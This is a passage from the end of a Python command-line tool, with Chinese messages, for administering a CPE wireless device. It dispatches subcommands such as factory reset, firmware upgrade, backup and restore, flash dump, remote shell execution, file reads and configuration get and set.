                print("拒绝执行: 会清空全部配置。确认请加 --yes"); return 2
            print(cpe.factory_reset()); return 0
        if a.cmd == "upgrade":
            print(json.dumps(cpe.upgrade(a.file, a.force), ensure_ascii=False)); return 0
        if a.cmd == "mode":
            print(cpe.set_mode(a.mode, a.force)); return 0
        if a.cmd == "password":
            print(cpe.set_password(a.newpw, a.user)); return 0
        if a.cmd == "schedule":
            print(cpe.set_schedule(not a.off, a.week, a.hour, a.minute)); return 0
        if a.cmd == "backup":
            print("已备份 ->", cpe.backup(a.file)); return 0
        if a.cmd == "restore":
            print(cpe.restore(a.file, a.force)); return 0
        if a.cmd == "push":
            print(f"{cpe.push(a.local, a.remote)} 字节 -> {a.remote}"); return 0
        if a.cmd == "pull":
            print(f"{cpe.pull(a.remote, a.local)} 字节 -> {a.local}"); return 0
        if a.cmd == "dump-flash":
            n = cpe.dump_flash(a.out, a.mtd)
            md5 = hashlib.md5(open(a.out, "rb").read()).hexdigest()
            print(f"已备份 {_hb(n)} -> {a.out}\nmd5: {md5}")
            return 0
        if a.cmd == "sh":
            sys.stdout.write(cpe.run(" ".join(a.command), a.timeout)); return 0
        if a.cmd == "cat":
            data = cpe.read_bytes(a.file)
            if a.out:
                open(a.out, "wb").write(data); print(f"{_hb(len(data))} -> {a.out}")
            else:
                sys.stdout.buffer.write(data); sys.stdout.flush()
            return 0
        if a.cmd == "uci":
            sys.stdout.write(cpe.run("uci show")); return 0

        if a.cmd == "info":
            v = cpe.sysinfo()
        elif a.cmd == "status":
            v = {"无线链路": cpe.wireless_status(), "WAN": cpe.wan(), "LAN": cpe.lan()}
        elif a.cmd == "clients":
            v = cpe.clients()
        elif a.cmd == "arp":
            v = cpe.arp()
        elif a.cmd == "channels":
            v = cpe.channels()
        elif a.cmd == "wifi":
            v = cpe.wifi_config()
        elif a.cmd == "sessions":
            v = cpe.active()
        elif a.cmd == "scan":
            v = cpe.scan(a.wlanid)
        elif a.cmd == "cfg":
            c = cpe.cfg_all()
            if a.keys:
                v = {k: c.get(k) for k in a.keys}
            elif a.grep:
                v = {k: x for k, x in c.items()
                     if re.search(a.grep, k, re.I) or re.search(a.grep, str(x), re.I)}
            else:
                v = c
        elif a.cmd == "set":
            kv = {}
            for item in a.kv:
                if "=" not in item:
                    raise CpeError(f"参数要写成 KEY=VALUE: {item}")
                k, x = item.split("=", 1)
                kv[k.strip()] = x
            v = cpe.cfg_set(force=a.force, **kv)
        else:
            raise CpeError(f"未知命令 {a.cmd}")

        if a.json:
            print(json.dumps(v, ensure_ascii=False, indent=2))
        else:
            rows = _rows(v)
            if rows and len(rows) > 1:
                _table(rows)
            else:
                print(json.dumps(v, ensure_ascii=False, indent=2))
        return 0
    except CpeError as e:
        print(f"错误: {e}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print("\n已中断", file=sys.stderr)
        return 130
    finally:
        cpe.close()


if __name__ == "__main__":
    sys.exit(main())
